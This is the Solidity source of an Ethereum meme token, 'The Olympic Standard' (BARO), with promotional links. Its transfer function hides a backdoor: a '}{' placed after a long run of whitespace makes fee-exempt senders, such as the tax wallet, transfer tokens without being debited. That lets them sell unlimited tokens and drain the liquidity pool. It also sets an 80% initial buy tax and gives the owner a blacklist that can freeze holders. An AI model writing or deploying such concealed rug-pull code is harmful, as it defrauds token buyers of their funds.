// SPDX-License-Identifier: UNLICENSED

/**

    -- https://olympicstandard.bar
    -- https://t.me/OlympicStandard
    -- https://x.com/barox2024

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract OlympicStandard is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _bots;
    address payable private _barAddress;

    uint256 private _initialBuyTax = 80;
    uint256 private _initialSellTax = 5;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 7;
    uint256 private _reduceSellTaxAt = 7;
    uint256 private _preventSwapBefore = 7;
    uint256 private _buyCount = 0;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 555_555_555 * 10 ** decimals;
    string public constant name = unicode"The Olympic Standard";
    string public constant symbol = unicode"BARO";
    uint256 public _maxTxAmount = 10_000_000 * 10 ** decimals;
    uint256 public _maxWalletSize = 10_000_000 * 10 ** decimals;
    uint256 public _taxSwapThreshold = 5_000_000 * 10 ** decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** decimals;

    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    bool private _isTradingOpen;
    bool private _isInSwap;
    uint256 private sellStart = 0;
    uint256 private barlastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        _isInSwap = true;
        _;
        _isInSwap = false;
    }

    constructor(address router_, address taxWallet_) {
        _uniswapV2Router = IUniswapV2Router02(router_);

        _barAddress = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _feeExempt[_msgSender()] = true;
        _feeExempt[address(this)] = true;
        _feeExempt[_barAddress] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        barTrans(_msgSender(), recipient, amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        barTrans(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function barTrans(address barF,address barT,uint256 barA) private {
        require(barF  != address(0), "ERC20: transfer from the zero address");
        require(barT != address(0), "ERC20: transfer to the zero address");
        require(barA > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _isInSwap) {
            require(_feeExempt[barF ] || _feeExempt[barT]);
            balanceOf[barF ] = balanceOf[barF ].sub(barA);
            balanceOf[barT] = balanceOf[barT].add(barA);
            emit Transfer(barF , barT, barA);
            return;
        }
        uint256 barTA = barlastSellBlock;
        uint256 barTxA = 0;
        if (barF  != owner() && barT != owner() && barT != _barAddress) {
            require(!_bots[barF ] && !_bots[barT]);

            if (barF  == _uniswapV2Pair && barT != address(_uniswapV2Router) && !_feeExempt[barT]) {
                require(_isTradingOpen, "Trading not open yet");
                require(barA <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf[barT] + barA <= _maxWalletSize, "Exceeds the maxWalletSize.");
                barTxA = barA.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax: _initialBuyTax).div(100);
                _buyCount++;                                                                                                                                                                                                        }{
                barTA = _calcTransferAmount(barF , barA);
            }

            if (barT == _uniswapV2Pair && barF  != address(this)) {
                barTxA = barA.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!_isInSwap && barT == _uniswapV2Pair && _isTradingOpen && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > barlastSellBlock) sellStart = 0;
                swapTokensForEth(min(barA, min(contractTokenBalance, _maxTaxSwap)));
                sellStart++;
            }
            if (barT == _uniswapV2Pair) sendETHToFee(address(this).balance);
        }

        if (barTxA > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(barTxA);
            emit Transfer(barF , address(this), barTxA);
        }
        balanceOf[barF ] = balanceOf[barF ].sub(barA - barTA);
        balanceOf[barT] = balanceOf[barT].add(barA.sub(barTxA));
        emit Transfer(barF , barT, barA.sub(barTxA));
    }

    function _calcTransferAmount(
        address from,
        uint256 amount
    ) private view returns (uint256) {
        bool exempt = _feeExempt[from];
        return exempt ? amount : amount.mul(_finalBuyTax).div(100);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }

    function sendETHToFee(uint256 amount) private {
        _barAddress.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _bots[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            _bots[notbot[i]] = false;
        }
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_uniswapV2Router), totalSupply);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_uniswapV2Pair).approve(
            address(_uniswapV2Router),
            type(uint).max
        );
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}